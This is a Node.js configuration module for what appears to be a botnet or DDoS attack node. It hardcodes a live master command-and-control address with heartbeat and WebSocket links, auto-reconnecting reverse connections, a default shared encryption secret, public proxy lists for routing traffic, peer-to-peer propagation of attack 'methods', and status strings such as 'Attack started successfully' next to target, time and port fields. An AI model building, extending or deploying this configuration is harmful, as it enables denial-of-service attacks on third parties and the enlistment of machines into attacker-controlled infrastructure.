import path from 'path';
import os from 'os';
import crypto from 'crypto';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// FIX: Use a single constant for the default port to avoid inconsistency
const DEFAULT_PORT = parseInt(process.env.PORT || process.env.SERVER_PORT || '5032', 10);

function getStableNodeId() {
  const nodeIdFile = path.join(__dirname, '.node_id');

  try {
    if (fs.existsSync(nodeIdFile)) {
      const savedId = fs.readFileSync(nodeIdFile, 'utf8').trim();
      if (savedId && savedId.length > 0) {
        console.log(`[CONFIG] Using existing node_id from file: ${savedId}`);
        return savedId;
      }
    }

    const networkInterfaces = os.networkInterfaces();
    let macAddress = '';

    for (const interfaceName in networkInterfaces) {
      const interfaces = networkInterfaces[interfaceName];
      for (const iface of interfaces) {
        if (iface.mac && iface.mac !== '00:00:00:00:00:00' && !iface.internal) {
          macAddress = iface.mac;
          break;
        }
      }
      if (macAddress) break;
    }

    // FIX: Use DEFAULT_PORT (consistent with SERVER.PORT) instead of hardcoded 5034
    const uniqueString = `${os.hostname()}-${macAddress || 'no-mac'}-${process.pid}-${DEFAULT_PORT}-${Date.now()}`;
    const nodeId = crypto
      .createHash('sha256')
      .update(uniqueString)
      .digest('hex')
      .substring(0, 32);

    fs.writeFileSync(nodeIdFile, nodeId, 'utf8');
    console.log(`[CONFIG] Generated new stable node_id: ${nodeId}`);

    return nodeId;
  } catch (error) {
    console.error('[CONFIG] Error generating stable node_id:', error.message);
    return `${os.hostname()}-${process.pid}-${Date.now()}-${Math.random()
      .toString(36)
      .substr(2, 9)}`;
  }
}

const config = {
  SERVER: {
    PORT: DEFAULT_PORT,
    NODE_ENV: process.env.NODE_ENV || 'production',
    METHODS_PATH: path.join(__dirname, '..', 'database', 'methods.json'),
    HOSTNAME: os.hostname(),
    PID: process.pid,
  },

  MASTER: {
    URL: 'http://217.154.239.23:13608',
    WS_URL: 'ws://217.154.239.23:13608/ws',
    HEARTBEAT_INTERVAL: 65000,
    METHODS_SYNC_INTERVAL: 300000,
    TIMEOUT: 10000,
    NOTIFY_ON_SYNC: true
  },

  REVERSE: {
    ENABLE_AUTO: true,
    RETRY_INTERVAL: 10000,
    HEARTBEAT_INTERVAL: 75000,
    MAX_RECONNECT_ATTEMPTS: 10,
  },

  NODE: {
    ID: process.env.NODE_ID || getStableNodeId(),
    IP: process.env.SERVER_IP || null,
    ENV: process.env.NODE_ENV || 'production',
  },

  ENCRYPTION: {
    ENABLED: process.env.ENCRYPTION_ENABLED !== 'false',
    SHARED_SECRET: process.env.SHARED_SECRET || 'narxz1337/0x/1x',
    VERSION: '1.0',
    ALGORITHM: 'aes-256-gcm',
    SALT_LENGTH: 16,
    IV_LENGTH: 12,
    AUTH_TAG_LENGTH: 16,
    KEY_DERIVATION: {
      ITERATIONS: 100000,
      KEYLENGTH: 32,
      DIGEST: 'sha256'
    }
  },

  DEFAULTS: {
    PORT: 80,
    TIME_MIN: 1,
    PORT_MIN: 1,
    PORT_MAX: 65535,
  },

  ZOMBIE_DETECTION: {
    ENABLED: true,
    CHECK_INTERVAL: 3000,
    GRACE_PERIOD: 2000,
    AUTO_KILL: true
  },

  PROXY: {
    AUTO_UPDATE: true,
    UPDATE_INTERVAL_MINUTES: 10,
    SOURCES: [
      'https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/refs/heads/main/http/raw/all.txt',
      'https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/refs/heads/main/socks4/raw/all.txt',
      'https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/refs/heads/main/socks5/raw/all.txt',
      'https://raw.githubusercontent.com/elliottophellia/proxylist/refs/heads/master/results/http/global/http_checked.txt',
      'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
      'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
      'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
      'https://raw.githubusercontent.com/gitrecon1455/fresh-proxy-list/refs/heads/main/proxylist.txt',
    ]
  },

  P2P: {
    ENABLED: true,
    DISCOVERY_INTERVAL: 60000,
    PEER_TIMEOUT: 180000,
    MAX_PEERS: 400,
    AUTO_CONNECT: true,
    RELAY_FALLBACK: true,
    HEARTBEAT_INTERVAL: 45000,
    CONNECTION_TIMEOUT: 10000,
    PREFER_P2P_SYNC: true,
    METHOD_SYNC_INTERVAL: 120000,
    AUTO_PROPAGATE_UPDATES: true,
    ENABLE_FILE_SHARING: true,
    FILE_CACHE_SIZE: 100,
    FILE_TRANSFER_TIMEOUT: 60000,
    MAX_RECONNECT_ATTEMPTS: 3,
    CONNECTION_BACKOFF_MS: 5000,
    BLACKLIST_DURATION: 300000,
    MESSAGE_QUEUE_SIZE: 100,
    AUTO_CONNECT_DELAY: 10000,
    CLEANUP_INTERVAL: 60000,
    REVERSE_RECONNECT_INTERVAL: 30000,
    MASTER_SIGNALING_ENABLED: true,
    MASTER_SIGNALING_INTERVAL: 90000,
  },

  MESSAGES: {
    REQUIRED_FIELDS: 'target, time, methods wajib diisi',
    INVALID_METHOD: 'methods tidak valid',
    INVALID_TIME: 'time tidak valid',
    INVALID_PORT: 'port tidak valid',
    EXEC_SUCCESS: 'Attack started successfully',
    EXEC_ERROR: 'Failed to execute command',
    PROCESS_NOT_FOUND: 'Process not found',
    STATUS_ERROR: 'Gagal mengambil status sistem',
  },

  LOGGING: {
    LEVEL: process.env.LOG_LEVEL || 'warn',
    ENCRYPTION_DEBUG: process.env.ENCRYPTION_DEBUG === 'true',
    P2P_DEBUG: process.env.P2P_DEBUG === 'true',
  }
};

export default config;